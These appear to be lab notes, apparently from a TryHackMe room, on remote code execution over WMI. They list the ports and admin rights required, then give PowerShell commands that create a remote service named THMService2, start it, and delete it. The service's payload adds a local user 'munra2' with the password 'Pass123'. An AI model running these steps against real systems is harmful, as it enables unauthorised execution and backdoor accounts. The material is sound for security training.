#### Requirements
- **Ports:**
	- 135/TCP, 49152-65535/TCP (DCERPC)
	- 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
	
- **Required Group Memberships:** Administrators

#### Create a service called `THMService2`
We can create services with WMI through PowerShell.
```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
Name = "THMService2";
DisplayName = "THMService2";
PathName = "net user munra2 Pass123 /add"; # Your payload
ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
StartMode = "Manual"
}
```

#### Get a Handle on the service and start it 
```powershell
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"

Invoke-CimMethod -InputObject $Service -MethodName StartService
```

#### Stop and Delete the service 
```powershell
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete
```
